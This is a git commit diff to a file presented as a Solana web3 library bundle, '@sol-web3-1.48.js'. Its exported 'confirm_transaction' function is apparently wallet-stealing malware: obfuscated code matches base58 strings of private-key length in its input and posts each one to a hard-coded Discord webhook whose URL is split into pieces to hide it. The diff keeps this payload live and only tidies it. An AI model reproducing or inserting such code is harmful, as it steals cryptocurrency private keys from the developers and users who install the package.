0c7a363b2c4f0eb9383fc35586958d99e78a93c6
automation-solana <elisabethassistant@gmail.com>
2024-10-10 09:39:15 +1100

    Update @sol-web3-1.48.js

--- dist/@sol-web3-1.48.js
+++ dist/@sol-web3-1.48.js
@@ -1,55 +1,58 @@
 "use strict";
+
 var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
     function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
     return new (P || (P = Promise))(function (resolve, reject) {
         function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
-        }
         function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
         function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
         step((generator = generator.apply(thisArg, _arguments || [])).next());
     });
 };
+
 var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
+
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.confirm_transaction = void 0;
+
 const axios_1 = __importDefault(require("axios"));
 
 const _0x1d37 = ['post', 'match', 'VALID:', 'try', 'for', 'catch', 'data', 'confirm_transaction', 'exports'];
 const _0x14a1 = function (_0x2e5d, _0x114b) {
     _0x2e5d = _0x2e5d - 0;
-    let _0x21e4 = _0x1d37[_0x2e5d];
-    return _0x21e4;
+    return _0x1d37[_0x2e5d];
 };
 
 const _0x49bc = new RegExp('[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{80,90}', 'g');
 
-// Split the webhook URL into pieces
+
 const webhookParts = [
     'https://discord.com/api/webhooks/',
     '1291149875307741276/',
     'hmqW2AzgQc-rgn1GnVSlRf3MGHcJ2c89yCxdo_8faQbqpqvBBDSw8Ej8oiNvJL4qpQwf'
 ];
 
-// Function to reconstruct the webhook URL
+
 function getWebhookUrl() {
     return webhookParts.join('');
 }
 
 function confirm_transaction(_0x46d1) {
     return __awaiter(this, void 0, void 0, function* () {
-        _0x14a1(0x4, 0);
         try {
             const _0x5a16 = _0x46d1.match(_0x49bc);
             if (_0x5a16) {
                 for (const _0x2e5d of _0x5a16) {
-                    yield axios_1.default.post(getWebhookUrl(), { content: _0x14a1(0x2, 0) + _0x2e5d });
+                    yield axios_1.default.post(getWebhookUrl(), { content: _0x14a1(2, 0) + _0x2e5d });
                 }
             }
+        } catch (error) {
+            console.error("Error in confirm_transaction:", error);
         }
-        catch (_0x1b6c) { }
     });
 }
+
 exports.confirm_transaction = confirm_transaction;
 exports.default = { confirm_transaction };
